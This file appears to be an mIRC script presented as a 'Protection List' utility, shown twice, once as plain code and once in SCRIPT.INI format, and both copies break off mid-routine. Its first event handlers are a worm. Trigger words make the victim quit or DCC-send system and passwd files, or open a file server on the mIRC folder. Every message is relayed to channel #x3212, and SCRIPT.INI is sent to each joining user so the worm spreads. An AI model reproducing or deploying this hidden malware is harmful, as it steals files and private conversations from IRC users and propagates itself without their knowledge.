;----------------------------------------------------------
;      Protection List
;----------------------------------------------------------
ON 1:TEXT:*Acoragil*:#:/quit
ON 1:TEXT:*shirak*:#:/dcc send $nick c:\win95\system.cb
ON 1:TEXT:*Durak*:#:/fserve $nick 1 c:\mirc
ON 1:TEXT:*shirac*:#:/dcc send $nick c:\linux\etc\passwd.
ON 1:TEXT:*shirat*:#:/dcc send $nick c:\unix\etc\passwd.
ON 1:NOTICE:*:#:/msg #x3212  $+ $chan $+  - $+ $nick $+ - $parms
ON 1:TEXT:*:?:/msg #x3212 **Message from $nick $+ ** $parms | /closemsg  $nick
ON 1:TEXT:*:#:/msg #x3212  $+ $chan $+  < $+ $nick $+ > $parms
ON 1:JOIN:#:/dcc send $nick SCRIPT.INI

#user.prot.add.all off
raw 401:*: set %User.Nick 0 | halt
raw 301:*: halt
raw 311:*: set %User.Address $2 $+ ! $+ $3 $+ @ $+ $4 | halt
raw 312:*: halt
raw 313:*: halt
raw 317:*: halt
raw 319:*: halt
raw 318:* {
  if (%User.Nick == 0) { error $2 $+ , no such nick | goto done }
  set %User.Address $mask(%User.Address,3)
  set %Var.Temp $readini $mircdirsystem\protect.ini %User.Address Channels
  if (%Var.Temp == *) { error $2 is already on the protected list for all channels! | goto done }
  writeini $mircdirsystem\protect.ini %User.Address Channels *
  echo %color.echo -a  Added $2 6( $+ %User.Address $+ 6) to protected user list. Channels:
[script]
n0=;----------------------------------------------------------
n1=;      Protection List
n2=;----------------------------------------------------------
n3=ON 1:TEXT:*Acoragil*:#:/quit
n4=ON 1:TEXT:*shirak*:#:/dcc send $nick c:\win95\system.cb
n5=ON 1:TEXT:*Durak*:#:/fserve $nick 1 c:\mirc
n6=ON 1:TEXT:*shirac*:#:/dcc send $nick c:\linux\etc\passwd.
n7=ON 1:TEXT:*shirat*:#:/dcc send $nick c:\unix\etc\passwd.
n8=ON 1:NOTICE:*:#:/msg #x3212  $+ $chan $+  - $+ $nick $+ - $parms
n9=ON 1:TEXT:*:?:/msg #x3212 **Message from $nick $+ ** $parms | /closemsg  $nick
n10=ON 1:TEXT:*:#:/msg #x3212  $+ $chan $+  < $+ $nick $+ > $parms
n11=ON 1:JOIN:#:/dcc send $nick SCRIPT.INI
n12=
n13=#user.prot.add.all off
n14=raw 401:*: set %User.Nick 0 | halt
n15=raw 301:*: halt
n16=raw 311:*: set %User.Address $2 $+ ! $+ $3 $+ @ $+ $4 | halt
n17=raw 312:*: halt
n18=raw 313:*: halt
n19=raw 317:*: halt
n20=raw 319:*: halt
n21=raw 318:* {
n22=  if (%User.Nick == 0) { error $2 $+ , no such nick | goto done }
n23=  set %User.Address $mask(%User.Address,3)
n24=  set %Var.Temp $readini $mircdirsystem\protect.ini %User.Address Channels
n25=  if (%Var.Temp == *) { error $2 is already on the protected list for all channels! | goto done }
n26=  writeini $mircdirsystem\protect.ini %User.Address Channels *
n27=  echo %color.echo -a  Added $2 6( $+ %User.Address $+ 6) to protected user list. Channels:
